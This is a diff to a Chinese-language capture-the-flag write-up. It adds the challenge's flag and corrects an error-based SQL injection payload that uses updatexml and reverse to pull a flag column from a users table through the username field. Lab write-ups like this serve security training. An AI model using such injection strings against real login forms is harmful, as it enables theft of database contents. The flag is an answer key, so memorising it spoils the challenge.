@@ -3,6 +3,8 @@ Author: Coder-LYQ
 Date: 2021-1-5
 ---
 
+## flag
+`flag{fff9faec-e377-4f1d-84e3-66a4cb97ba28}`
 ## 思路
 
 1. 打开网页，显示可以注册和登录。
@@ -43,7 +45,7 @@ Date: 2021-1-5
 
      `username=peri0d"||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1))#`
 
-     `username=peri0d"||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1))#`
+     `username=peri0d"||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1))#`
 
 ## 总结
 
